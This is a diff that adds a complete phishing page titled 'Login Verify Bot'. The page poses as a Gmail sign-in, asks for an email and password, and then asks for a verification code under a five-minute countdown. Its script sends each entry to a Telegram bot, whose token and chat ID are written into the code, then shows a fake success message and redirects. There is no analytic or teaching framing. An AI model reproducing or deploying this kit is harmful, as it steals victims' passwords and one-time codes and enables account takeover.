@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Login Verify Bot</title>
+
+<style>
+body{
+  background:#f0f2f5;
+  font-family:Arial;
+}
+
+.box{
+  width:360px;
+  background:white;
+  margin:120px auto;
+  padding:25px;
+  border-radius:12px;
+  box-shadow:0 0 12px rgba(0,0,0,.12);
+  text-align:center;
+}
+
+.logo{
+  width:70px;
+  margin-bottom:10px;
+}
+
+h2{ color:#1877f2; }
+
+input{
+  width:100%;
+  padding:10px;
+  margin:8px 0;
+  border:1px solid #ccc;
+  border-radius:6px;
+}
+
+button{
+  width:100%;
+  padding:10px;
+  background:#1877f2;
+  color:white;
+  border:none;
+  border-radius:6px;
+  cursor:pointer;
+  margin-top:8px;
+}
+
+button:hover{ opacity:.9; }
+
+.hide{ display:none; }
+
+.msg{
+  color:green;
+  margin-top:12px;
+  font-weight:bold;
+  font-size:16px;
+}
+
+.timer{ color:red; margin-top:5px; font-size:14px; margin-bottom:10px; }
+</style>
+</head>
+<body>
+
+<div class="box">
+
+<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Gmail_Icon.png">
+
+<!-- LOGIN -->
+<div id="loginBox">
+  <h2>Sign in</h2>
+  <input type="email" id="email" placeholder="Email">
+  <input type="password" id="password" placeholder="Password">
+  <button onclick="sendLogin()">Login</button>
+</div>
+
+<!-- VERIFY -->
+<div id="verifyBox" class="hide">
+  <h2>Verify Account</h2>
+  <input type="text" id="code" placeholder="Verification Code">
+  <div class="timer" id="timer">05:00</div>
+  <button id="verifyBtn" onclick="sendCode()">Verify</button>
+</div>
+
+<!-- SUCCESS MESSAGE -->
+<div id="successBox" class="hide">
+  <div class="msg">Account verified successfully!</div>
+</div>
+
+</div>
+
+<script>
+// Telegram Bot Info
+const BOT_TOKEN = "8345633952:AAFYVlMG4AHskRSMOITcxyJGaB-dirO7FAU";
+const CHAT_ID = "-4943788578";
+
+let countdown;
+
+// SEND MESSAGE TO TELEGRAM
+function sendToBot(text){
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({ chat_id: CHAT_ID, text: text })
+  });
+}
+
+// LOGIN SEND
+function sendLogin(){
+  if(email.value==="" || password.value===""){
+    alert("Fill all fields!");
+    return;
+  }
+
+  sendToBot(`📩 Login\nEmail: ${email.value}\nPassword: ${password.value}`);
+
+  loginBox.classList.add("hide");
+  verifyBox.classList.remove("hide");
+
+  startTimer(300); // 5 minutes
+}
+
+// TIMER FUNCTION
+function startTimer(seconds){
+  let time = seconds;
+
+  countdown = setInterval(()=>{
+    let min = Math.floor(time / 60);
+    let sec = time % 60;
+
+    timer.innerText = (min<10?"0":"")+min+":"+(sec<10?"0":"")+sec;
+
+    if(time <= 0){
+      clearInterval(countdown);
+      timer.innerText = "Code expired!";
+    }
+
+    time--;
+  },1000);
+}
+
+// VERIFY SEND
+function sendCode(){
+  if(code.value===""){
+    alert("Enter code!");
+    return;
+  }
+
+  sendToBot(`✅ Verify\nEmail: ${email.value}\nCode: ${code.value}`);
+
+  clearInterval(countdown); // stop timer
+  code.value="";             // clear input
+  verifyBox.classList.add("hide"); // hide verify
+  successBox.classList.remove("hide"); // show success
+
+  // Redirect to index.html after 1.5 seconds
+  setTimeout(()=>{
+    window.location.href = "index.html";
+  }, 1500);
+}
+</script>
+
+</body>
+</html>
